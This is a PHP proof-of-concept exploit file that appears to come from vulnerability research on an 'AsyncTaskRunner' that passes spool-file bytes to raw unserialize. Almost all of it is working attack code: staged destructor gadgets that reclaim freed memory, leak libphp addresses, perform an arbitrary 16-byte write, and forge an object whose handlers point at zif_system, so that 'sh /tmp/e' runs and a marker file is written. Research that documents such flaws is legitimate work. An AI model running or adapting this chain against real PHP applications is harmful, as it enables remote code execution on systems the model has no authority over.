<?php
/**
 * AsyncTaskRunner RCE-lane clone — same shape as runner.php (readPayload →
 * raw unserialize), but the app-side gadget is a staged class. The stage
 * selector and the (leaked/calibrated) addresses ride INSIDE the serialized
 * payload as object properties — the attacker controls only spool-file
 * bytes, so this is exactly how a real chain delivers them.
 *
 * Stages (mirroring poc_matrix/vdR1_leak.php, vdR2_write.php, vdR3_call.php):
 *   calib : reclaim + R:1020 forged-pointer deref (faults with rax=0x4242…)
 *   leak  : qword oracle -> zval_ptr_dtor (libphp base), d->first_dtor, d->last
 *   write : 16-byte arbitrary write
 *   call  : forged zend_object -> handlers->get_class_name = zif_system
 */

abstract class NativeAsyncStage {
    /** "calib" | "leak" | "write" | "call" */
    public string $stage = 'calib';
    /** decimal addresses, pipe-separated: chunk|base|d|dtor */
    public string $addr = '0|0|0|0';

    protected function addrs(): array {
        $p = array_map('intval', explode('|', $this->addr));
        return [
            'chunk' => $p[0] ?? 0, 'base' => $p[1] ?? 0,
            'd' => $p[2] ?? 0, 'dtor' => $p[3] ?? 0,
        ];
    }
}

class NativeAsyncCalib extends NativeAsyncStage {
    public function __destruct() {
        $s = str_repeat('B', 8159);          // reclaim the freed var_entries block
        $r = @unserialize('R:1020;');        // forged zval* = 0x4242424242424242
        var_dump($r);
    }
}

class NativeAsyncLeak extends NativeAsyncStage {
    public function __destruct() {
        $a = $this->addrs();
        $CHUNK = $a['chunk']; $BASE = $a['base']; $D = $a['d'];
        $T1 = $BASE + 0x10dc8c0;  // &EG(symbol_table).pDestructor (binary-relative)
        $T2 = $D + 8;             // &d->first_dtor
        $T3 = $D + 0;             // &d->last
        $P1 = $CHUNK + 24 + 24; $P2 = $CHUNK + 24 + 40; $P3 = $CHUNK + 24 + 56;
        $pat  = pack('PPP', $P1, $P2, $P3);
        $pat .= pack('PVV', $T1 - 16, 6, 0);
        $pat .= pack('PVV', $T2 - 16, 6, 0);
        $pat .= pack('PVV', $T3 - 16, 6, 0);
        $pat .= str_repeat("\x00", 8);
        $s = str_repeat($pat, 102);          // 8160-byte single-alloc reclaim
        $r1 = @unserialize('R:1020;');
        $r2 = @unserialize('R:1021;');
        $r3 = @unserialize('R:1022;');
        $l1 = strlen($r1); $l2 = strlen($r2); $l3 = strlen($r3);
        echo "LEAK1 EG(symbol_table).pDestructor = 0x", dechex($l1),
             "  (= zval_ptr_dtor, base+0x", dechex($l1 - $BASE), ")\n";
        echo "LEAK2 d->first_dtor = 0x", dechex($l2), "\n";
        echo "LEAK3 d->last       = 0x", dechex($l3), "\n";
    }
}

class NativeAsyncWrite extends NativeAsyncStage {
    public function __destruct() {
        $a = $this->addrs();
        $CHUNK = $a['chunk']; $DTOR = $a['dtor'];
        $W = $DTOR + 4000;                   // write target: live var_dtor_entries tail
        $P1 = $CHUNK + 24 + 24; $P3 = $CHUNK + 24 + 56;
        $pat  = pack('PP', $P1, $W);
        $pat .= pack('P', $P3);
        $pat .= pack('PVV', $W - 16, 6, 0);
        $pat .= str_repeat("\x00", 16);
        $pat .= pack('PVV', $W - 16, 6, 0);
        $pat .= str_repeat("\x00", 8);
        $s = str_repeat($pat, 102);
        $r1 = @unserialize('R:1020;');
        $before = strlen($r1);
        echo "WRITE-TARGET 0x", dechex($W), " BEFORE = 0x", dechex($before), "\n";
        $r2 = @unserialize('R:1021;');       // ZVAL_NEW_REF: 16-byte write at W
        $r3 = @unserialize('R:1022;');
        $after = strlen($r3);
        echo "WRITE-TARGET 0x", dechex($W), " AFTER  = 0x", dechex($after),
             "  (zend_reference* heap ptr; type_info@W+8 -> 0x30A)\n";
        if ($before != $after) { echo "WRITE RECEIPT: *W changed\n"; }
        else { echo "WRITE FAILED: no change\n"; }
    }
}

class NativeAsyncCall extends NativeAsyncStage {
    public function __destruct() {
        $a = $this->addrs();
        $CHUNK = $a['chunk']; $BASE = $a['base'];
        $ZIF_SYSTEM = $BASE + 0x523c60;
        $V = function (int $off) use ($CHUNK): int { return $CHUNK + 24 + $off; };
        $OBJ = $V(32); $HT = $V(600); $CE = $V(1600); $SMINI = $V(128);
        $pat  = pack('P', $V(16));
        $pat .= str_repeat("\x00", 8);
        $pat .= pack('PVV', $OBJ, 8, 0);           // fz @16: {value=OBJ, IS_OBJECT}
        $pat .= pack('VV', 1, 8);                  // OBJ gc
        $pat .= pack('VV', 0x1337, 0);
        $pat .= pack('P', $CE);
        $pat .= pack('P', $HT);
        $pat .= pack('P', 0);
        $pat .= pack('P', 0x0000000100000000);     // num_args=1 @+44
        $pat .= str_repeat("\x00", 32);
        $pat .= pack('PVV', $SMINI, 6, 0);         // arg1 = zend_string @+80
        $pat .= pack('VV', 1, 0x16);
        $pat .= pack('P', 0);
        $pat .= pack('P', 9);
        $pat .= "sh /tmp/e\x00";
        $pat .= str_repeat("\x00", 600 - 162);
        $h  = pack('VV', 0, 0);
        $h .= pack('P', 0);
        $h .= pack('P', $ZIF_SYSTEM);              // dtor_obj
        $h .= str_repeat("\x00", 136 - 24);
        $h .= pack('P', $ZIF_SYSTEM);              // get_class_name
        $h .= str_repeat("\x00", 160 - 144);
        $h .= pack('P', $ZIF_SYSTEM);              // get_debug_info
        $h .= str_repeat("\x00", 208 - 168);
        $pat .= $h;
        $pat .= str_repeat("\x00", 1600 - 808);
        $pat .= str_repeat("\x00", 2040 - 1600);
        $s = str_repeat($pat, 4);                  // 8160-byte reclaim
        echo "forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($ZIF_SYSTEM), "\n";
        $r1 = @unserialize('R:1020;');
        echo "TRIGGERING var_dump(\$r1) -> handlers->get_class_name(obj)=zif_system(fake_execute_data)\n";
        var_dump($r1);                             // CALL
        echo "SURVIVED-CALL\n";
    }
}

/* ---- AsyncTaskRunner::runTask shape ---- */
@unlink('/tmp/pwned_nativephp');
file_put_contents('/tmp/e', "id > /tmp/pwned_nativephp\n");

$id = getenv('NATIVEPHP_TASK_ID') ?: ($argv[1] ?? '');
$path = __DIR__ . '/storage/framework/async/payload/' . $id . '.task';

if (!is_file($path)) {
    echo "payload missing for $id\n";
    exit(0);
}

$payload = file_get_contents($path);
@unlink($path);
echo "payload_len=" . strlen($payload) . "\n";

try {
    $work = unserialize($payload);          // AsyncTaskRunner.php:55 verbatim semantics
    echo "unserialize returned " . var_export($work !== false, true) . "\n";
    echo "SURVIVED\n";
} catch (Throwable $e) {
    echo "runner caught: " . $e->getMessage() . "\n";
}
